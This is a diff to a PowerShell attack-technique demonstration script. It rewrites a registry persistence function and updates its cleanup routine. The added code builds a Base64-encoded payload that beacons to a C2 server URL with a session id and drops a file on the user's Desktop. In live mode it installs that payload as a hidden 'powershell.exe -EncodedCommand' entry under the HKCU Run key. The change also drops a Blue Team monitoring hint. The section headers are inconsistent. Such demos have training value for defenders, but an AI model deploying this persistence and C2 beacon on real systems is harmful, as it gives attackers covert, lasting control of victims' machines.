@@ -288,15 +288,24 @@ function Set-EnvPayload {
 # TECHNIQUE 7: PROCESS HOLLOWING CONCEPT
 # ==========================================================================
 function Show-RegistryPersistence {
-   Write-Host "[+] Technique 7: Registry-Based Persistence (DEMO ONLY - Not Executed)" -ForegroundColor Green
-
-    Write-Host "[+] Technique 5: Registry-Based Persistence" -ForegroundColor Green
+    Write-Host "[+] Technique 5: Registry-Based Persistence (DEMO ONLY - Not Executed)" -ForegroundColor Green
 
     $registryPath = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
     $regKeyName = 'DemoApp'
 
-    # Payload to create an execution marker at user logon
-    $payload = 'Add-Content -Path "C:\temp\execution_marker.txt" -Value "Successfully executed payload via Reg Run Key."'
+    # Desktop path where the payload will create a marker file on user logon
+    $desktopPath = [Environment]::GetFolderPath('Desktop')
+
+    # Payload to run at user logon:
+    # - Send a simple GET to the configured C2 server to say "hi"
+    # - Create a marker file on the user's Desktop called 'HI.txt'
+    $payload = @"
+try {
+    Invoke-RestMethod -Uri '$Global:C2Url/?message=hi&session=$($Global:UniqueId)' -Method Get -ErrorAction SilentlyContinue
+    Add-Content -Path '$desktopPath\HI.txt' -Value 'Successfully executed payload via Reg Run Key.' -ErrorAction SilentlyContinue
+} catch { }
+"@
+
     $encodedPayload = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($payload))
     $runValue = "powershell.exe -WindowStyle Hidden -EncodedCommand $encodedPayload"
 
@@ -305,22 +314,10 @@ function Show-RegistryPersistence {
         Write-Host "    [*] Target key: $registryPath" -ForegroundColor Gray
         Write-Host "    [*] Example Run value (not written):" -ForegroundColor Gray
         Write-Host "      $runValue" -ForegroundColor DarkGray
-        Write-Host "" 
-        Write-Host "    [DEMO] Blue Team should monitor Run/RunOnce keys for suspicious entries." -ForegroundColor Yellow
+        Write-Host ""
+        Write-Host "    [DEMO] On user logon this would: (1) GET $Global:C2Url/?message=hi&session=<id> and (2) create file: $desktopPath\HI.txt" -ForegroundColor Yellow
     }
     else {
-        # Ensure C:\temp exists so the payload can write to it at logon
-        if (-not (Test-Path -Path 'C:\temp')) {
-            try {
-                New-Item -Path 'C:\temp' -ItemType Directory -Force | Out-Null
-                Write-Host "    [LIVE] Created folder C:\temp" -ForegroundColor Green
-            }
-            catch {
-                Write-Error "    [!] Failed to create C:\temp: $($_.Exception.Message)"
-                return
-            }
-        }
-
         try {
             Set-ItemProperty -Path $registryPath -Name $regKeyName -Value $runValue -Type String -Force -ErrorAction Stop
             Write-Host "    [LIVE] Successfully set registry persistence key: $registryPath\$regKeyName" -ForegroundColor Green
@@ -336,13 +333,11 @@ function Undo-LiveChanges {
 
     $registryPath = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
     $regKeyName = 'DemoApp'
-    $file = 'C:\temp\execution_marker.txt'
-    $dir = 'C:\temp'
+    $desktopFile = Join-Path -Path ([Environment]::GetFolderPath('Desktop')) -ChildPath 'HI.txt'
 
     if ($Global:DemoMode) {
         Write-Host "    [DEMO] Would remove registry value: $registryPath\$regKeyName" -ForegroundColor Yellow
-        Write-Host "    [DEMO] Would remove file: $file" -ForegroundColor Yellow
-        Write-Host "    [DEMO] Would remove folder (if empty): $dir" -ForegroundColor Yellow
+        Write-Host "    [DEMO] Would remove file: $desktopFile" -ForegroundColor Yellow
         return
     }
 
@@ -362,34 +357,17 @@ function Undo-LiveChanges {
     }
 
     # Remove file if exists
-    if (Test-Path -Path $file) {
+    if (Test-Path -Path $desktopFile) {
         try {
-            Remove-Item -Path $file -Force -ErrorAction Stop
-            Write-Host "    [OK] Removed file: $file" -ForegroundColor Green
+            Remove-Item -Path $desktopFile -Force -ErrorAction Stop
+            Write-Host "    [OK] Removed file: $desktopFile" -ForegroundColor Green
         }
         catch {
-            Write-Error "    [!] Failed to remove file ${file}: $($_.Exception.Message)"
+            Write-Error "    [!] Failed to remove file ${desktopFile}: $($_.Exception.Message)"
         }
     }
     else {
-        Write-Host "    [*] File not found: $file" -ForegroundColor Gray
-    }
-
-    # Remove directory if empty
-    if (Test-Path -Path $dir) {
-        try {
-            $count = (Get-ChildItem -Path $dir -Force -ErrorAction SilentlyContinue | Measure-Object).Count
-            if ($count -eq 0) {
-                Remove-Item -Path $dir -Force -ErrorAction Stop
-                Write-Host "    [OK] Removed empty folder: $dir" -ForegroundColor Green
-            }
-            else {
-                Write-Host "    [*] Folder not empty, leaving: $dir" -ForegroundColor Gray
-            }
-        }
-        catch {
-            Write-Error "    [!] Failed to remove folder ${dir}: $($_.Exception.Message)"
-        }
+        Write-Host "    [*] File not found: $desktopFile" -ForegroundColor Gray
     }
 
     Write-Host "[*] Undo complete." -ForegroundColor Cyan
